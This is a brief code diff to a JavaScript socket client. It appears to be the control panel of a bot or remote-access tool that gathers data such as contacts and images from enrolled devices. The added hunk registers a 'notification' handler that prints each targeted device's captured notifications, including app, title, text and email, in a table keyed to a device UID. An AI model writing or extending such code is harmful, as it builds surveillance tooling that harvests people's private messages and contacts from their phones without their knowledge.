@@ -11,7 +11,6 @@ socket.on("registerBotClient", function (data) {
         newBotHandler(data.botDataList[i])
 });
 
-
 function newBotHandler(data) {
     console.log(data);
     var d = new Date();
@@ -186,6 +185,16 @@ socket.on('usrData', function (data) {
         if (data.data.dataType === 'downloadImage') downloadImage(data.data);
     } else console.log('UID did not match');
 
+});
+
+socket.on("notification", function (data) {
+    console.log(data);
+    const notifColumns = ['app', 'ts', 'title', 'text', 'ticker', 'email'];
+    if (data.uid === currentUID) {
+        for (notif of data.data){
+            console.table(notif, notifColumns);
+        }
+    }
 });
 
 function handleContacts(data) {
